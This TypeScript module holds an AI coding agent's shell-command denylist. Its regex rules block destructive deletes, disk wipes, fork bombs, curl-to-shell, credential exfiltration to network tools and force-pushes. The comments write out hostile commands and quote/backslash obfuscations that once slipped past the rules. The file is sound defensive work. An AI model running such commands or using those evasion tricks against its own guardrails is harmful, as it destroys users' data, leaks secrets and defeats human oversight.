/** HARD_DENY rule corpus — the DATA half of the permission policy (SRP).
 *
 *  This module holds ONLY the static deny-rule data: the shell/interpreter/
 *  exfil/system-root regex group literals, the `HardDenyRule` shape, the
 *  ordered `HARD_DENY_RULES` catalog, and the flat `HARD_DENY` pattern
 *  projection. The resolver ENGINE (`evaluate`/`evaluateAuto`/`evaluateStack`/
 *  `inferToolTier`/`hardDenyReason`) lives in `policy.ts` and imports this
 *  corpus back. Order is precedence-significant and every pattern is
 *  byte-for-byte identical to the pre-extraction definition. */

/** Patterns refused outright regardless of mode. Best-effort, conservative
 *  denylist — NOT a sandbox and NOT an exhaustive policy engine (RFC §1.2:
 *  Phase 1 is a local dev tool). It only blocks the concrete, documented
 *  high-blast-radius bypasses; a determined command can still evade a regex.
 *  Each pattern is tuned to avoid false-positives on legitimate dev commands
 *  (e.g. `rm -rf ./build`, `find . -name x`, `chmod -R 755 ./dist`). */
/**
 * Shell interpreter family used in pipe-to-shell guards. Includes POSIX +
 * extended shells (`ksh`, `csh`/`tcsh`, `ash`) and the non-POSIX entries
 * `fish`, `pwsh`, plus macOS `osascript` (which on macOS executes
 * AppleScript / JavaScript-for-Automation — a full RCE channel that the
 * narrower `(ba|z|da)?sh` set missed). Any new shell entry here MUST stay
 * a static literal — no user input — so the regex engine can't be
 * influenced by attacker-controlled text.
 */
const SHELL_GROUP = "(?:(?:ba|z|da|k|c|tc|a)?sh|fish|pwsh|osascript)"

/**
 * Script-interpreter family for the `curl … | <interp>` RCE bypass. The
 * baseline set covers POSIX scripting languages; the additions catch the
 * modern + macOS attack surface that previously slipped past:
 *   - `lua` — common embedded scripting interp.
 *   - `osascript` — macOS AppleScript / JXA executor.
 *   - `pwsh` — PowerShell Core (cross-platform).
 *   - `deno`, `bun` — modern JS/TS runtimes.
 *   - `tsx` — `ts-node`/tsx pipe execution.
 *   - `swift` — macOS Swift script runner.
 */
const INTERP_GROUP = "(?:python[0-9.]*|perl|node|ruby|php|lua|osascript|pwsh|deno|bun|tsx|swift)"

/**
 * Network-egress / exfiltration channel family. The original set (`curl`,
 * `wget`, `nc`, `ncat`, `socat`, `telnet`) only covered direct
 * stdout-piping tools; an attacker who can also reach for `openssl s_client`,
 * `ssh`/`scp`/`sftp`/`rsync`, `mail`/`sendmail`/`mailx`, `ftp`/`tftp`, or a
 * cloud-CLI uploader (`aws`, `gh`, `gcloud`, `az`) has equivalent
 * exfiltration capability. Adding them closes the documented
 * credential-exfil bypass classes.
 */
const EXFIL_GROUP =
  "(?:curl|wget|nc|ncat|socat|telnet|openssl|ssh|scp|sftp|rsync|mail|sendmail|mailx|ftp|tftp|aws|gh|gcloud|az)"

/**
 * Anchored-on-`/` system root token set for the `rm -rf` / `chmod -R` /
 * `find` guards. The original set covered the Linux FHS (`/etc`, `/usr`,
 * `/var`, …). We add the macOS top-level directories:
 *   - `Users` — every user's home tree lives here.
 *   - `Library` — system + user library state.
 *   - `Applications` — installed apps.
 *   - `System`, `Network`, `Volumes`, `private` — macOS system roots.
 * All entries are matched as an absolute root (the surrounding pattern
 * requires a leading `/`), so a project-relative `./Users/foo` does NOT
 * match — only `/Users/...` does.
 */
const SYSTEM_ROOTS =
  "etc|usr|var|bin|sbin|lib64|lib|opt|root|boot|dev|sys|proc|home|srv|run|mnt|media|Users|Library|Applications|System|Network|Volumes|private"

/**
 * A single HARD_DENY rule. Refactor A: stripped per-rule `mustBlock` /
 * `mustAllow` arrays — those lived in the SAME file as the pattern, so the
 * rule author and the test-fixture author were the same person in the same
 * PR (self-attestation loop: if both were wrong the same way, tests still
 * passed). Adversarial fixtures now live in
 * `tests/unit/permission-rules.fixtures.ts`, a SEPARATE corpus reviewed
 * independently from the regex itself.
 *
 * The runtime contract is `name` + `description` + `pattern`. Behavior is
 * preserved bit-for-bit: `HARD_DENY` below is just the rules' `pattern`
 * field projected into an array, in the same order the original flat array
 * used, so `hardDenyReason()` short-circuits identically.
 */
interface HardDenyRule {
  /** Stable identifier (kebab-case) — referenced in deny messages and tests. */
  readonly name: string
  /** One-line WHAT-and-WHY of the rule. No marketing. */
  readonly description: string
  /** The denial pattern. */
  readonly pattern: RegExp
}

const HARD_DENY_RULES: readonly HardDenyRule[] = [
  {
    name: "rm-recursive-force-system-root",
    description:
      "Recursive+force `rm` whose target is `/`, `~`, `$HOME`, `/*`, or an absolute system root (Linux FHS + macOS roots). Project-relative and /tmp targets stay allowed.",
    // R-Phase5 P1-D: all three lazy spans are length-bounded to 500 chars to
    // prevent catastrophic backtracking on adversarial inputs. Real-world bash
    // commands are well under this limit (`rm -rf /etc/foo` is ~16 chars); a
    // hypothetical 500+ char `rm` command with the wrong flag/target shape
    // would simply not match the rule (still falls through to other gates).
    // The simpler `[\s\S]{0,500}?` replaces the equivalent `(?:\s|[\s\S]){0,500}?`
    // — `\s ⊂ [\s\S]` so the alternation was redundant.
    // S-Audit P1: the trailing terminator set was widened from `\s|$|;|&|\|`
    // to ALSO accept a closing quote (`"`/`'`) or closing paren (`)`). Without
    // it, an absolute-root `rm -rf` wrapped in a subshell (`(rm -rf /)`) or a
    // quoted `-c` payload (`bash -c "rm -rf /"`, `rm -rf "/usr"`, `rm -rf '/var'`)
    // slipped the rule because the target `/`…`)`/`"`/`'` had no whitespace
    // terminator after it. The target group still REQUIRES an absolute/home
    // root (`$HOME`/`~`/`/<root>`), so project-relative quoted targets like
    // `rm -rf "./dist"` stay allowed. Strengthens the deny only.
    pattern: new RegExp(
      String.raw`\brm\b(?=(?:\s+-(?:[a-zA-Z]*[rR][a-zA-Z]*|-recursive\b))(?:\s|$)|[\s\S]{0,500}?\s-(?:[a-zA-Z]*[rR][a-zA-Z]*|-recursive)\b)(?=[\s\S]{0,500}?\s-(?:[a-zA-Z]*[fF][a-zA-Z]*|-force)\b)[\s\S]{0,500}?\s["'(]?(?:\$\{?HOME\}?|~|\/(?:\*|${SYSTEM_ROOTS})?)(?:\/\S*)?(?=\s|$|;|&|\||["')])`,
    ),
  },
  {
    name: "find-absolute-root-delete-or-exec-rm",
    description:
      "`find` rooted at `/`, `~`, or `$HOME` combined with `-delete` or `-exec rm` — a mass-deletion sweep of an absolute or home tree.",
    pattern: /\bfind\s+(\/|~|\$HOME)\S*.*-(delete|exec\s+rm)\b/,
  },
  {
    name: "find-action-flag-set",
    description:
      "PATH-INDEPENDENT `find` action flags (-delete, -exec, -execdir, -fprintf, -fprint, -fprint0, -fls, -ok, -okdir) — block regardless of root; safe predicates like -name/-type/-print stay allowed.",
    pattern: /\bfind\b[\s\S]*?\s-(delete|exec|execdir|fprintf|fprint0?|fls|ok|okdir)\b/,
  },
  {
    name: "git-config-injection",
    description:
      "`git -c <anything>` (lowercase) arbitrary config override — execution-via-config bypass. Capital-C `git -C <dir>` (change-dir) stays allowed: JS regex is case-sensitive.",
    pattern: /\bgit\b[\s\S]*?\s-c[\s=]/,
  },
  {
    name: "git-exec-path-hijack",
    description:
      "`git --exec-path[=…]` redirects git's helper-exec lookup to an attacker dir — RCE via planted git-* shim.",
    pattern: /\bgit\b[\s\S]*?\s--exec-path\b/,
  },
  {
    name: "git-config-env-injection",
    description:
      "`git --config-env[=…]` sources a config value from an attacker-controlled env var — same blast radius as `-c` injection.",
    pattern: /\bgit\b[\s\S]*?\s--config-env\b/,
  },
  // --- ADR-0100: destructive-git verbatim ban (Codex §18.4 absorption) ---
  // The agent must not run history-rewriting or work-destroying git commands
  // without an EXPLICIT user request. The prompt layer (ADR-0099 / Git posture
  // section) tells the model not to use these; this catalog is the runtime
  // backstop for when the prompt is ignored or a user request is twisted into
  // running them anyway. Each pattern is length-bounded (`[\s\S]{0,500}?`) to
  // prevent ReDoS on adversarial inputs, matching the existing rule style.
  {
    name: "git-reset-hard",
    description:
      "`git reset --hard` — overwrites the working tree AND moves HEAD, discarding any uncommitted edits with no recovery path (no entry in `git reflog` for the lost worktree state).",
    pattern: /\bgit\b[\s\S]{0,500}?\breset\b[\s\S]{0,500}?--hard\b/,
  },
  {
    name: "git-push-force",
    description:
      "`git push --force` / `--force-with-lease` / `-f` — rewrites published history on the remote; other clones lose commits or develop divergent histories that require manual recovery.",
    pattern: /\bgit\b[\s\S]{0,500}?\bpush\b[\s\S]{0,500}?(?:--force(?:-with-lease)?\b|\s-f\b)/,
  },
  {
    name: "git-checkout-discard",
    description:
      "`git checkout -- <path>` / `git checkout .` / `git checkout <ref> -- <path>` — restores files from index or a ref, silently overwriting any working-tree edits. No reflog entry for the discarded changes.",
    pattern: /\bgit\b[\s\S]{0,500}?\bcheckout\b[\s\S]{0,500}?(?:\s--\s|\s\.(?=\s|$)|\s--$)/,
  },
  {
    name: "git-commit-amend",
    description:
      "`git commit --amend` — rewrites the previous commit. Safe locally on un-pushed commits, catastrophic on commits other clones already have. The default is to forbid and require an explicit user request.",
    pattern: /\bgit\b[\s\S]{0,500}?\bcommit\b[\s\S]{0,500}?--amend\b/,
  },
  {
    name: "git-rebase-interactive",
    description:
      "`git rebase -i` / `--interactive` — opens an editor for an interactive rebase. In a non-TTY agent context this either hangs waiting for input or proceeds with broken state; either way it is not what the user expects.",
    pattern: /\bgit\b[\s\S]{0,500}?\brebase\b[\s\S]{0,500}?(?:--interactive\b|\s-i\b)/,
  },
  {
    name: "git-clean-force",
    description:
      "`git clean -f` / `--force` — irreversibly deletes untracked files (and with `-d` also untracked directories). No undo. The default is to forbid; the user can invoke their own shell if they truly want it.",
    // The `(?=[a-zA-Z]*[fF])` lookahead lets `f` appear anywhere in the
    // grouped-flag arg, so `-fd`, `-df`, `-fdx`, `-Fx` all match — not just
    // forms where `f` is the last letter. Pinned to `-` + at least one
    // letter, so `--force` is the alternative literal.
    pattern:
      /\bgit\b[\s\S]{0,500}?\bclean\b[\s\S]{0,500}?(?:-(?=[a-zA-Z]*[fF])[a-zA-Z]+\b|--force\b)/,
  },
  // --- ADR-0101: push mass-delete guard (Claude Desktop `push_refused_mass_delete`) ---
  // Claude Desktop's cowork memory sync refuses a push that would mass-delete
  // remote state. The equivalent in our pre-tool dispatch context is to
  // recognize the three canonical mass-delete forms on `git push` and block
  // them outright. Individual `git push --delete <remote> <branch>` for a
  // single ref stays governed by the operator's chosen sandbox profile
  // (ADR-0297 — sandbox-driven HITL replaced the bash `GIT_PREFIX` regex
  // matcher; under unset / `workspace-write-net` the tier is `always-
  // confirm` for ALL bash calls, so routine branch cleanup still gets one
  // confirmation; under `read-only` the OS refuses the push outright).
  {
    name: "git-push-mirror",
    description:
      "`git push --mirror` — pushes ALL refs including deletes, mirroring the local view onto the remote. A bug locally (a deleted branch you didn't mean to delete) becomes a bug on the remote with no undo.",
    pattern: /\bgit\b[\s\S]{0,500}?\bpush\b[\s\S]{0,500}?--mirror\b/,
  },
  {
    name: "git-push-force-with-delete",
    description:
      "`git push --force` combined with `--delete` / `-d` — force-deleting a remote ref. Even one ref makes recovery hard (no reflog on the remote); the combination is treated as catastrophic regardless of count.",
    // Two flag orderings: `--force` then `--delete`, or `--delete` then
    // `--force`. The pattern requires BOTH tokens present anywhere in the
    // span after `push`; short-flag `-f` and `-d` count as their long forms.
    pattern:
      /\bgit\b[\s\S]{0,500}?\bpush\b(?=[\s\S]{0,500}?(?:--force(?:-with-lease)?\b|\s-f\b))(?=[\s\S]{0,500}?(?:--delete\b|\s-d\b))/,
  },
  {
    name: "git-push-multi-branch-delete",
    description:
      "`git push <remote> :a :b :c …` — three-or-more colon-prefixed refspecs in a single push are interpreted by git as branch deletions on the remote. Bulk deletion of remote branches is treated as catastrophic.",
    // Three or more occurrences of `\s:<refname>` (whitespace + colon + a
    // non-trivial name) after `git push`. The refname character class
    // mirrors git's allowed branch-name alphabet (no `..`, no leading `-`,
    // no `:` or whitespace — kept conservative).
    pattern: /\bgit\b[\s\S]{0,500}?\bpush\b(?:[\s\S]{0,500}?\s:[A-Za-z0-9._/+-]+){3,}/,
  },
  {
    name: "mkfs-format-filesystem",
    description: "`mkfs*` formats a filesystem — irreversible volume wipe.",
    pattern: /\bmkfs\b/,
  },
  {
    name: "dd-write-to-dev",
    description:
      "`dd … of=/dev/…` writes raw bytes to a block device — disk-wipe / partition clobber.",
    pattern: /\bdd\s+.*\bof=\/dev\//,
  },
  {
    name: "fork-bomb",
    description: "Classic `:(){ :|:& };:` shell fork bomb — denies the system.",
    pattern: /:\(\)\s*\{\s*:\|:&\s*\}\s*;/,
  },
  {
    name: "chmod-recursive-system-root",
    description:
      '`chmod -R` (recursive) whose target is `/`, `~`, or `$HOME` — mass permission clobber. Optional opening quote/paren + widened terminator catch the quoted/subshell forms (`chmod -R 777 "/"`, `(chmod -R 777 /)`).',
    // S-Audit P1: same quote/paren terminator widening as the `rm` rule —
    // a quoted or subshell-wrapped absolute-root target previously slipped.
    // The root token (`/`/`~`/`$HOME`) is still required so relative targets
    // (`chmod -R 755 ./dist`) stay allowed.
    pattern: /\bchmod\s+-[a-zA-Z]*R[a-zA-Z]*\s+\S+\s+["'(]?(\/|~|\$HOME)(\s|$|["')])/,
  },
  {
    name: "curl-wget-pipe-to-shell",
    description:
      "Network download piped straight into a shell interpreter (POSIX + ksh/csh/tcsh/ash/fish/pwsh/osascript) — classic RCE bypass.",
    pattern: new RegExp(String.raw`\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?${SHELL_GROUP}\b`),
  },
  {
    name: "shutdown-reboot-halt-command",
    description:
      "`shutdown`/`reboot`/`halt` appearing as an actual command (segment start, after `;`/`&&`/`||`/`|`, or after `sudo`) — NOT the bare word inside a path or commit message.",
    pattern: /(?:^|[;&|]|\bsudo\s+)\s*(?:shutdown|reboot|halt)\b/,
  },
  {
    name: "credential-exfil-pipe",
    description:
      "Reading a well-known local secret store (~/.ssh, ~/.aws/credentials, id_rsa, .netrc, .pgpass, ~/.gnupg, .env*) and piping into a network sender (curl/wget/nc/ncat/socat/telnet/openssl/ssh/scp/sftp/rsync/mail/sendmail/mailx/ftp/tftp/aws/gh/gcloud/az).",
    pattern: new RegExp(
      String.raw`(?:~\/\.ssh\b|\$HOME\/\.ssh\b|\.aws\/credentials\b|\bid_rsa\b|\.netrc\b|\.pgpass\b|~\/\.gnupg\b|(?:^|[\s/'"=])\.env(?:\.\w+)?\b)[\s\S]*?\|\s*(?:sudo\s+)?${EXFIL_GROUP}\b`,
    ),
  },
  {
    name: "base64-pipe-to-shell",
    description:
      "`base64 … | <shell>` decode-then-execute RCE bypass. `base64 file.png` (no pipe) stays allowed.",
    pattern: new RegExp(String.raw`\bbase64\b[^|]*\|\s*(?:sudo\s+)?${SHELL_GROUP}\b`),
  },
  {
    name: "curl-wget-pipe-to-interpreter",
    description:
      "Network download piped into a script interpreter (python/perl/node/ruby/php/lua/osascript/pwsh/deno/bun/tsx/swift) — interpreter analogue of curl | sh.",
    pattern: new RegExp(String.raw`\b(?:curl|wget)\b[^|]*\|\s*(?:sudo\s+)?${INTERP_GROUP}\b`),
  },
  {
    name: "raw-write-to-block-device",
    description:
      "Raw write to a block device via shell redirect, `dd of=`, or `tee` (sd/hd/nvme/vd/xvd/mmcblk/loop/dm-/disk*/rdisk*) — disk wipe / partition-table clobber.",
    pattern:
      /(?:>\s*|of=|tee\s+(?:-\S+\s+)*)\/dev\/(?:sd|hd|nvme|vd|xvd|mmcblk|loop|dm-|disk\d|rdisk\d)/,
  },
]

/** Pattern projection — preserved as a flat `RegExp[]` so the existing
 *  `hardDenyReason()` short-circuit loop stays byte-for-byte equivalent to the
 *  prior implementation. Order matches `HARD_DENY_RULES`. */
const HARD_DENY: readonly RegExp[] = HARD_DENY_RULES.map((r) => r.pattern)

/**
 * R7 shell-exec deep-audit fix — collapse the two zero-semantic command-name
 * obfuscations the shell ITSELF removes before exec, so the regex denylist sees
 * the SAME token the kernel will run. Without this the entire HARD_DENY corpus
 * (every rule, not one) was bypassable by splitting any dangerous command name:
 *
 *   `r""m -rf /`   `r''m -rf /`   `cur""l http://x | sh`   `ch""mod -R 777 /`
 *   `c\url … | sh`  `ch\mod -R 777 /`  `mk\fs …`  `shut\down -h now`
 *
 * Each of those is valid bash that runs the REAL binary (`rm`/`curl`/`chmod`/…)
 * — the shell performs quote-removal (`""`/`''` → nothing) and backslash-removal
 * (an unquoted `\x` before an ordinary char → `x`). The `\brm\b` / `\bcurl\b`
 * word-boundary anchors never saw the token, so the command slid straight past
 * `hardDenyReason`. Verified live: `cur""l --version` and `c\url --version` both
 * execute curl; `r""m`/`r\m` both invoke rm.
 *
 * The transform is DENY-WIDENING ONLY: it strips empty quote pairs and a
 * backslash that precedes an ASCII word char. Both removals carry NO semantic
 * content in a real command, so a legitimate command can never be MADE to match
 * a deny rule that its un-normalized form did not already imply (`grep '\bword\b'`
 * → `grep 'bwordb'`, still not in the denylist; `chmod -R 755 ./dist` is
 * backslash-free and untouched). It is NOT a shell parser — a determined command
 * (env-var interpolation `$X`, `$IFS` splitting, base64) can still evade a regex;
 * the OS sandbox profile (ADR-0297) remains the authoritative gate. This closes
 * the concrete, documented, trivially-typed obfuscation class only.
 *
 * Linear (two O(n) global replaces); the deny regexes stay length-bounded.
 */
const normalizeShellForDeny = (command: string): string =>
  command.replace(/''|""/g, "").replace(/\\([A-Za-z0-9])/g, "$1")

export { HARD_DENY, HARD_DENY_RULES, type HardDenyRule, normalizeShellForDeny }
